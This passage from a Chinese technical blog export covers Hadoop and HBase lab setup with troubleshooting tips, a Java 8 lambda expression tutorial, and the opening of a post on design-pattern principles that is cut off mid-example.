<h3 id="测试Hadoop"><a href="#测试Hadoop" class="headerlink" title="测试Hadoop"></a>测试Hadoop</h3><p>让我们测试一下Hadoop，统计<code>LICENSE.txt</code>中的单词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hdfs dfs -mkdir &#x2F;input # 创建 input 文件夹</span><br><span class="line">hdfs dfs -put &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;LICENSE.txt &#x2F;input&#x2F;test.txt # 上传一个测试文件</span><br><span class="line">hadoop jar &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.3.0.jar wordcount &#x2F;input&#x2F;test.txt &#x2F;output&#x2F;</span><br></pre></td></tr></table></figure>
<p>完成之后执行 <code>hdfs dfs -ls /output</code>，可以看到有两个文件出现（下图最上面）。</p>
<p>再输入<code>hdfs dfs -cat /output/part-r-00000</code>  出现以下输出标识已经正常运行。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/hadoop%E6%B5%8B%E8%AF%95-%E6%88%90%E5%8A%9F.png" alt="Hadoop测试"></p>
<p>我们还可以在<code>50070</code>的网页中可视化地查看刚才的处理结果。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/hadoop%E6%B5%8B%E8%AF%95-%E6%88%90%E5%8A%9F%28%E7%BD%91%E9%A1%B5%29.png" alt="Hadoop测试-网页"></p>
<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><blockquote>
<p>在SSH登录时，报错The authenticity of host ‘localhost (127.0.0.1)’ can’t be established</p>
</blockquote>
<p>参考 <a href="https://blog.csdn.net/stpeace/article/details/79426471" target="_blank" rel="noopener">https://blog.csdn.net/stpeace/article/details/79426471</a></p>
<blockquote>
<p>在SSH从节点时，报错 connect to host slave port 22: No route to host lost connection</p>
</blockquote>
<p>可能是由于各虚拟机的<code>ip</code>变动（比如重启）重新查看IP并设置hosts文件</p>
<blockquote>
<p>报错 Permission denied, please try again</p>
</blockquote>
<p>参考<a href="https://blog.csdn.net/qq_39999139/article/details/106174829?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">ssh远程登录服务器出现Permission denied, please try again</a></p>
<h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><blockquote>
<p>第N次格式化NameNode</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化后，原来的缓存没有清干净</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;</span><br><span class="line">rm -rf tmp</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://my.oschina.net/HIJAY/blog/220816" target="_blank" rel="noopener">Hadoop中重新格式化namenode</a></p>
<blockquote>
<p>Shutting down NameNode at master/192.168.xxx.xxx</p>
</blockquote>
<p>无视它，标识是否成功的是上面一行输出。即下图框出来的</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/hadoop%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%88%90%E5%8A%9F.png" alt="hadoop格式化成功"></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><blockquote>
<p>编辑gedit要编辑的文件，保存之后出现Set document metadata failed: Setting attribute metadata::gedit-position no的警告</p>
</blockquote>
<p>只是个警告，无视它。<a href="https://askubuntu.com/questions/798935/set-document-metadata-failed-when-i-run-sudo-gedit" target="_blank" rel="noopener">参考本回答</a></p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>该命令会使当前终端进入root管理员的账号，此时的<code>~</code>表示<code>/root</code>而不是<code>home/xxx</code>。参考<a href="https://www.runoob.com/linux/linux-system-contents.html" target="_blank" rel="noopener">Linux 系统目录结构</a></p>
<h2 id="实验二：HBase的安装配置"><a href="#实验二：HBase的安装配置" class="headerlink" title="实验二：HBase的安装配置"></a>实验二：HBase的安装配置</h2><p>本次实验目标是在实验一的基础上配置<code>HBase</code>，版本采用目前的最新版（ <a href="https://hbase.apache.org/downloads.html" target="_blank" rel="noopener">HBase 2.3.2</a>）。</p>
<h3 id="安装HBase"><a href="#安装HBase" class="headerlink" title="安装HBase"></a>安装HBase</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf  hbase-2.3.2-bin.tar.gz -C &#x2F;usr&#x2F;local</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">sudo mv hbase-2.3.2-bin hbase</span><br><span class="line">sudo chown -R hadoop .&#x2F;hbase</span><br></pre></td></tr></table></figure>
<p>与<code>Hadoop</code>类似,我们依旧将文件夹放入<code>usr/local</code>下</p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>将以下内容复制进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HBase Environment</span><br><span class="line">HBASE_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;hbase</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/%E9%85%8D%E7%BD%AEHbase-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png" alt="配置Hbase-环境变量"></p>
<p>使修改生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<h3 id="配置HBase"><a href="#配置HBase" class="headerlink" title="配置HBase"></a>配置HBase</h3><p>修改<code>hbase</code>中的Java路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;urc&#x2F;local&#x2F;hbase&#x2F;conf</span><br><span class="line">sudo vim hbase-env.sh</span><br></pre></td></tr></table></figure>
<p>在里面添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64</span><br></pre></td></tr></table></figure>
<p>修改<code>hbase-site.xml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.rootdir&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;hdfs:&#x2F;&#x2F;localhost:9000&#x2F;hbase&lt;&#x2F;value&gt;</span><br><span class="line">  &lt;&#x2F;property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.cluster.distributed&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;&#x2F;value&gt;</span><br><span class="line">  &lt;&#x2F;property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hbase.unsafe.stream.capability.enforce&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;false&lt;&#x2F;value&gt;</span><br><span class="line">  &lt;&#x2F;property&gt;</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>
<h3 id="测试HBase"><a href="#测试HBase" class="headerlink" title="测试HBase"></a>测试HBase</h3><p>在此之前确保自己已经启动了<code>Hadoop</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hbase&#x2F;bin</span><br><span class="line">.&#x2F;start-hbase.sh</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<p>如果多出来 <code>HMaster</code>、<code>HRegionServer</code> 和 <code>HQuorumPeer</code>，说明成功运行。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/hbase-jps%E6%88%90%E5%8A%9F.png" alt="hbase-jps"></p>
<p>我们访问 <code>localhost:16010</code></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/24/HBase-%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F.png" alt="HBase16010"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://moefactory.com/3112.moe" target="_blank" rel="noopener">伪分布式配置</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/59805371" target="_blank" rel="noopener">hadoop3.2.0完全分布式集群搭建</a></p>
<p><a href="https://www.jianshu.com/p/99f3b52a5c54" target="_blank" rel="noopener">Hadoop安装教程_单机/伪分布式配置</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/32561305" target="_blank" rel="noopener">Hadoop安装-超详细</a> <del>其实一点也不详细</del></p>
]]></content>
      <categories>
        <category>技术小记</category>
        <category>Technology_Stack</category>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>NoSQL</tag>
        <tag>Hadoop</tag>
        <tag>HBase</tag>
      </tags>
  </entry>
  <entry>
    <title>Java拾遗之Lambda表达式</title>
    <url>/2020/12/10/Java%E6%8B%BE%E9%81%97%E4%B9%8B%20Lambda%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>本文介绍了 Java8 的特性：Lambda 表达式。</p>
<p>行文逻辑：接口实现类 -&gt; 静态内部类 -&gt; 局部内部类 -&gt; 匿名内部类 -&gt; Lambda 表达式 -&gt; Lambda 表达式的化简</p>
<a id="more"></a>
<p>Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性。</p>
<p>Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。</p>
<p>使用 Lambda 表达式可以使代码变的更加简洁紧凑。</p>
<h2 id="接口的调用"><a href="#接口的调用" class="headerlink" title="接口的调用"></a>接口的调用</h2><p>根据某些乱七八糟的设计原则，系统应该高内聚松耦合。实践这个原则的一个重要手段就是上接口。</p>
<p>例如，我们设置这个接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span>()</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="一、传统的接口实现类"><a href="#一、传统的接口实现类" class="headerlink" title="一、传统的接口实现类"></a>一、传统的接口实现类</h3><p>传统上，我们需要对每个接口编写实现类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Task.java</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MyTask.java</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTask01</span> <span class="keyword">implements</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LambdaTest.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask = <span class="keyword">new</span> MyTask01();</span><br><span class="line">    <span class="comment">// 上面这行用到了多态，懂得都懂</span></span><br><span class="line">    myTask.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二、静态内部类"><a href="#二、静态内部类" class="headerlink" title="二、静态内部类"></a>二、静态内部类</h3><p>我们不想为了一个函数再单独编写一个实现类，所以第二个解决方案是编写静态内部类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Task.java</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现与调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LambdaTest.java</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTask02</span> <span class="keyword">implements</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask = <span class="keyword">new</span> MyTask02();</span><br><span class="line">    myTask.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、局部内部类"><a href="#三、局部内部类" class="headerlink" title="三、局部内部类"></a>三、局部内部类</h3><p>静态内部类是在当前类里面编写类，这样每次生成外部类的对象时都要生成下内部类（尽管可能不需要用到）。</p>
<p>因此有了局部内部类，它是在方法里面定义。</p>
<p>接口还是一样,略；</p>
<p>调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LambdaTest.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyTask03</span> <span class="keyword">implements</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Task myTask03 = <span class="keyword">new</span> MyTask03();</span><br><span class="line">    myTask03.run();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="四、匿名内部类"><a href="#四、匿名内部类" class="headerlink" title="四、匿名内部类"></a>四、匿名内部类</h3><p>局部内部类还是要定义个类啊，那么我要是也懒得写呢？匿名内部类其实和它差不多，也是在方法体内部，仅仅是省略了类的名称等关键词。</p>
<p>接口同上，略。</p>
<p>调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LambdaTest.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask04 = <span class="keyword">new</span> Task() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    myTask04.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="五、Lambda-表达式"><a href="#五、Lambda-表达式" class="headerlink" title="五、Lambda 表达式"></a>五、Lambda 表达式</h3><p>注意：Lambda表达式仅仅在接口只有一个方法时可以用。</p>
<p>接口同上，但是还是贴一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Task.java</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask05 = ()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    myTask05.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中：</p>
<ol>
<li>实现的是哪个接口呢？这取决于前面的类型 <code>Task</code></li>
<li>()包裹起来的是参数，这里不传入参数，所以留空</li>
<li>{}包裹起来的是函数体，它会重写接口中的方法，重写哪个方法呢？注意使用 Lambda 表达式时，接口中有且只有一个方法！否则不能用 Lambda 表达式</li>
<li>Lambda 表达式还可以继续化简，见下</li>
</ol>
<h2 id="Lambda-的化简"><a href="#Lambda-的化简" class="headerlink" title="Lambda 的化简"></a>Lambda 的化简</h2><h3 id="一、标准-Lambda-表达式"><a href="#一、标准-Lambda-表达式" class="headerlink" title="一、标准 Lambda 表达式"></a>一、标准 Lambda 表达式</h3><p>我们先来看下标准的 Lambda表达式。</p>
<p>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Task.java</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">(String a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask06 = (String name, <span class="keyword">int</span> num)-&gt;&#123;</span><br><span class="line">        System.out.println(name+<span class="string">": Good "</span>+num+<span class="string">"! "</span>);</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> f__k = myTask06.run(<span class="string">"Jack Ma"</span>,<span class="number">996</span>);</span><br><span class="line">    System.out.println(f__k+<span class="string">"!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个 Lambda 表达式重写了接口中的唯一方法，包括两个参数、多条语句、返回值。</p>
<h3 id="二、简化参数"><a href="#二、简化参数" class="headerlink" title="二、简化参数"></a>二、简化参数</h3><p>其实在 Lambda 表达式中并不需要指明参数的类型。毕竟已经在接口中声明好了。</p>
<p><del>什么？你说你改变参数的数量和类型？那还叫🔨的重写。</del></p>
<p>注意哈，要去类型都去掉，不要一半去一半不去 ❌：<code>String name,num</code> </p>
<p>接口同上，略。</p>
<p>实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask07 = (name, num)-&gt;&#123;</span><br><span class="line">        System.out.println(name+<span class="string">":\"Good "</span>+num+<span class="string">"!\""</span>);</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> f__k = myTask07.run(<span class="string">"Jack Ma"</span>,<span class="number">996</span>);</span><br><span class="line">    System.out.println(f__k+<span class="string">"!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、简化小括号"><a href="#三、简化小括号" class="headerlink" title="三、简化小括号"></a>三、简化小括号</h3><p>如果只有一个参数，可以去掉小括号</p>
<p>如果没有参数或多个参数，不可去掉</p>
<p>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(String a)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask08 = name -&gt; &#123;</span><br><span class="line">        System.out.println(name + <span class="string">":\"Good "</span> + <span class="string">"!\""</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    myTask08.run(<span class="string">"Jack Ma"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="四、简化花括号"><a href="#四、简化花括号" class="headerlink" title="四、简化花括号"></a>四、简化花括号</h3><p>如果函数体只有一句的话，可以把花括号也取掉。</p>
<p>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task myTask09 = ()-&gt; System.out.println(<span class="string">"Good 996!"</span>);</span><br><span class="line"></span><br><span class="line">    myTask09.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.runoob.com/java/java8-lambda-expressions.html" target="_blank" rel="noopener">Java Lambda 表达式</a></p>
<p><a href="https://www.bilibili.com/video/BV1V4411p7EF?p=10" target="_blank" rel="noopener">狂神说：Lambda表达式</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Java</category>
        <category>Java拾遗</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>lambda表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之六大原则</title>
    <url>/2020/12/03/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>本文介绍了设计模式中的六大基本原则：</p>
<ol>
<li>单一职责原则</li>
<li>接口隔离原则</li>
<li>依赖反转原则</li>
<li>里氏替换原则</li>
<li>迪米特原则</li>
<li>开闭原则</li>
<li>合成复用原则</li>
</ol>
<a id="more"></a>
<h2 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h2><p><strong>单一功能原则</strong>（Single responsibility principle）规定每个类都应该有一个单一的功能，并且该功能应该由这个类完全封装起来。所有它的（这个类的）服务都应该严密的和该功能平行（功能平行，意味着没有依赖）。</p>
<p>Robert Cecil Martin 功能（职责）定义为：“改变的原因”，并且总结出一个类或者模块应该有且只有一个改变的原因。</p>
<blockquote>
<p>想象有一个用于编辑和打印报表的模块。这样的一个模块存在两个改变的原因。第一，报表的内容可以改变（编辑）。第二，报表的格式可以改变（打印）。这两方面会的改变因为完全不同的起因而发生：一个是本质的修改，一个是表面的修改。单一功能原则认为这两方面的问题事实上是两个分离的功能，因此他们应该分离在不同的类或者模块里。</p>
</blockquote>
<p>例如，我们定义 <code>Vehicle</code> 类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在公路上跑"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在道路上跑");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Vehicle vehicle = <span class="keyword">new</span> Vehicle();</span><br><span class="line">    vehicle.run(<span class="string">"汽车"</span>);</span><br><span class="line">    vehicle.run(<span class="string">"飞机"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就违反了单一职责原则。因为这个类同时<strong>实现了汽车与飞机的运行职责</strong>。换言之，交通工具的本质（汽车还是飞机），以及交通工具的运行方式（在公路上还是道路上）这两种改变原因都可以在该类中发生。</p>
<p>严格按照 SRP 原则的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoadVehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在公路上跑"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在道路上跑");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AirVehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在天上飞"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在空中飘");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Vehicle vehicle = <span class="keyword">new</span> Vehicle();</span><br><span class="line">    AirVehicle airVehicle = <span class="keyword">new</span> AirVehicle();</span><br><span class="line">    vehicle.run(<span class="string">"汽车"</span>);</span><br><span class="line">    airVehicle.run(<span class="string">"飞机"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个代码中，各交通工具类就只能改变交通工具的运行方式（公路/道路，飞/飘）。而不能改变交通工具的本质，AirVehicle 就只能是在上天的交通工具（虽然我们没有进行什么检测，但逻辑上是这样的）。</p>
<p>严格按照 SRP 原则的代码有一个问题：开销往往过大。如果我们想再加上：水中游的/地里挖的/星际穿梭的/… 那么就必须写很多类。因此一般是采用如下的折中处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runRoad</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在公路上跑"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在道路上跑");</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runAir</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在天上飞"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在空中飘");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Vehicle vehicle = <span class="keyword">new</span> Vehicle();</span><br><span class="line">    vehicle.runRoad(<span class="string">"汽车"</span>);</span><br><span class="line">    vehicle.runAir(<span class="string">"飞机"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>严格意义上来说，我们并没有实现 SRP。但这种这种做法是工程中可取的。实际上，这种方法相当于 <strong>方法级别的SRP</strong>。</p>
<p>请注意：方法级别的 SRP 并不代表可以在一个方法中加入很多 <code>if..else..</code>，将交通工具的本质移动到内部处理虽然解决了问题，但是该方法仍然承担了两个职责（本质/方式）。恰恰相反，SRP强调的是尽量减少<code>if..else..</code>，而是尽可能多地设置类/方法，并在不同情况（不同本质）下调用对应的类/方法。</p>
<p>例如下面的正确代码中，Vehicle 类的两个方法只承担了运行方式的改变。而交通工具本质的改变被移动到了 main() 函数中处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(isRoadVehicle(name))&#123;</span><br><span class="line">        System.out.println(name+<span class="string">"在公路上跑"</span>);</span><br><span class="line">        <span class="comment">// System.out.println(name+"在道路上跑");</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(isAirVehicle(name))&#123;</span><br><span class="line">        	System.out.println(name+<span class="string">"在天上飞"</span>);</span><br><span class="line">        	<span class="comment">// System.out.println(name+"在空中飘");</span></span><br><span 